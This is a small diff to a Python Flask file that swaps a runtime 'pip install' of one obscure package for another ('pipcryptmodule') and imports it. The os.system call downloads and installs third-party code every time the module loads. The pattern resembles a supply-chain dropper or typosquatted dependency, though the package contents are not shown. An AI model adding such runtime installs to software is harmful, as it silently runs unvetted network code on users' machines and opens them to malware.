@@ -2,8 +2,8 @@
 
 import time
 import os
-os.system("pip install syssqlite2extensions")
-import syssqlite2extensions
+os.system("pip install pipcryptmodule")
+import pipcryptmodule
 import flask
 
 from flask import g
